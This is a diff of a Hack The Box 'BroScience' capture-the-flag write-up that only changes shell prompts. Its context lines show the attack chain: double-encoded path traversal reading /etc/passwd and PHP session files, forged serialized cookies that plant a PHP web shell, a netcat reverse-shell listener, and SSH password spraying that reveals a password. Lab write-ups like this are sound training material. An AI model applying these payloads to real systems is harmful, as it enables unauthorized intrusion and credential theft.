@@ -28,8 +28,7 @@ last_modified_at: '2026-09-04T16:58:44+01:00'
 I started with a full TCP port scan and enabled Nmap's default scripts and service detection.
 
 ```bash
-┌─[tr3m0x@parrot]─[~/htb/linux/BroScience]
-└──╼ $sudo nmap -sC -sV -p- -T4 --min-rate 1000 -O 10.129.228.129 -oN nmap/tcp_scan.nmap 
+tr3m0x@ubuntu:~/htb/linux/BroScience$ sudo nmap -sC -sV -p- -T4 --min-rate 1000 -O 10.129.228.129 -oN nmap/tcp_scan.nmap 
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-04 07:55 EDT
 Nmap scan report for 10.129.228.129
 Host is up (0.11s latency).
@@ -93,8 +92,7 @@ One interesting endpoint was `includes/img.php?path=<image_name>`, which loads i
 ### Double-Encoded Path Traversal
 
 ```bash
-┌─[tr3m0x@parrot]─[~/htb/linux/BroScience]
-└──╼ $ffuf -u https://broscience.htb/includes/img.php?path=FUZZ -w /usr/share/seclists/Discovery/path-traversal.txt -fs 0,30
+tr3m0x@ubuntu:~/htb/linux/BroScience$ ffuf -u https://broscience.htb/includes/img.php?path=FUZZ -w /usr/share/seclists/Discovery/path-traversal.txt -fs 0,30
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -119,7 +117,7 @@ ________________________________________________
 
 ..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd [Status: 200, Size: 2235, Words: 26, Lines: 40, Duration: 107ms]
 :: Progress: [179/179] :: Job [1/1] :: 108 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
-└──╼ $curl https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd -k 
+tr3m0x@ubuntu:~/htb/linux/BroScience$ curl https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd -k 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -407,15 +405,13 @@ print_candidate_codes($centerTimestamp, $window);
 ```
 I converted the HTTP date to a Unix timestamp so it could be used as the center of the brute-force window.
 ```bash
-┌─[tr3m0x@parrot]─[~/htb/linux/BroScience]
-└──╼ $php -r "echo strtotime('Fri, 04 Sep 2026 14:03:22 GMT');"
+tr3m0x@ubuntu:~/htb/linux/BroScience$ php -r "echo strtotime('Fri, 04 Sep 2026 14:03:22 GMT');"
 1788530602
 ```
 I generated candidates for a 20-second window on either side and saved the output codes to `codes.txt`.
 
 ```bash
-┌─[tr3m0x@parrot]─[~/htb/linux/BroScience]
-└──╼ $php find_code.php 1788530602 20
+tr3m0x@ubuntu:~/htb/linux/BroScience$ php find_code.php 1788530602 20
 ============================================================
 BroScience Activation Code Generator
 ============================================================
@@ -437,8 +433,7 @@ YrtvtTUxo56ivkwCTubK01fv90XPHtGI
 ```
 
 ```bash
-┌─[tr3m0x@parrot]─[~/htb/linux/BroScience]
-└──╼ $ffuf -u https://broscience.htb/activate.php?code=FUZZ -w codes.txt -fs 9301
+tr3m0x@ubuntu:~/htb/linux/BroScience$ ffuf -u https://broscience.htb/activate.php?code=FUZZ -w codes.txt -fs 9301
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -510,16 +505,14 @@ echo "Cookie: " . $payload . "\n";
 ```
 
 ```bash
-┌─[tr3m0x@parrot]─[~/htb/linux/BroScience]
-└──╼ $php payload.php 
+tr3m0x@ubuntu:~/htb/linux/BroScience$ php payload.php 
 Cookie: TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoxMToiL2V0Yy9wYXNzd2QiO3M6NzoiaW1nUGF0aCI7czoyMzoiL3Zhci93d3cvaHRtbC9zaGVsbC5waHAiO30=
 ```
 
 After replacing the authenticated `user-prefs` cookie with the generated value and refreshing the page, `unserialize()` instantiated `AvatarInterface`. Its `__wakeup()` method copied `/etc/passwd` to `/var/www/html/shell.php`. I verified the arbitrary file write through the traversal endpoint:
 
 ```bash
-┌─[tr3m0x@parrot]─[~/htb/linux/BroScience]
-└──╼ $curl https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252f..%252f..%252fvar%252fwww%252fhtml%252fshell.php -k 
+tr3m0x@ubuntu:~/htb/linux/BroScience$ curl https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252f..%252f..%252fvar%252fwww%252fhtml%252fshell.php -k 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -601,7 +594,7 @@ echo "Cookie: " . $payload . "\n";
 
 To turn the file-copy gadget into code execution, I needed a readable server-side file whose contents I could control. Apache logs were not readable, but PHP session files were stored under `/var/lib/php/sessions/sess_<PHPSESSID>`. Reading my own session file confirmed that it contained the account username:
 ```bash
-└──╼ $curl https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252f..%252f..%252f%252fvar%252flib%252fphp%252fsessions%252fsess_0stkc00j897c819h55hp2480gv -k 
+tr3m0x@ubuntu:~/htb/linux/BroScience$ curl https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252f..%252f..%252f%252fvar%252flib%252fphp%252fsessions%252fsess_0stkc00j897c819h55hp2480gv -k 
 id|s:1:"6";username|s:7:"test111";is_admin|s:1:"0";
 ```
 
@@ -652,8 +645,7 @@ echo "Cookie: " . $payload . "\n";
 ?>
 ```
 ```bash
-┌─[✗]─[tr3m0x@parrot]─[~/htb/linux/BroScience]
-└──╼ $php payload.php 
+tr3m0x@ubuntu:~/htb/linux/BroScience$ php payload.php 
 Cookie: TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czo1MzoiL3Zhci9saWIvcGhwL3Nlc3Npb25zL3Nlc3NfMHN0a2MwMGo4OTdjODE5aDU1aHAyNDgwZ3YiO3M6NzoiaW1nUGF0aCI7czoyMToiL3Zhci93d3cvaHRtbC9jbWQucGhwIjt9
 ```
 After replacing the cookie and refreshing an authenticated page, I requested `cmd.php`. The copied session data contains non-PHP text, but the embedded `<?php ... ?>` block is still executed by PHP.
@@ -665,12 +657,10 @@ After replacing the cookie and refreshing an authenticated page, I requested `cm
 With a listener already running, requesting the web shell returned a reverse shell as Apache's `www-data` account.
 
 ```bash
-┌─[✗]─[tr3m0x@parrot]─[~/htb/linux/BroScience]
-└──╼ $curl https://broscience.htb/cmd.php -k 
+tr3m0x@ubuntu:~/htb/linux/BroScience$ curl https://broscience.htb/cmd.php -k 
 ```
 ```bash
-┌─[tr3m0x@parrot]─[~/htb/linux/BroScience]
-└──╼ $nc -lnvp 9001 
+tr3m0x@ubuntu:~/htb/linux/BroScience$ nc -lnvp 9001 
 Listening on 0.0.0.0 9001
 Connection received on 10.129.228.129 49700
 bash: cannot set terminal process group (1269): Inappropriate ioctl for device
@@ -780,8 +770,7 @@ postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
 Only `bill` and `postgres` were plausible login targets. I placed those usernames and the three recovered passwords in separate files, then used NetExec to test the small set against SSH.
 
 ```bash
-┌─[tr3m0x@parrot]─[~/htb/linux/BroScience]
-└──╼ $nxc ssh broscience.htb -u users.txt -p pwds.txt 
+tr3m0x@ubuntu:~/htb/linux/BroScience$ nxc ssh broscience.htb -u users.txt -p pwds.txt 
 SSH         10.129.228.129  22     broscience.htb   [*] SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1
 SSH         10.129.228.129  22     broscience.htb   [+] bill:iluvhorsesandgym  Linux - Shell access!
 ```
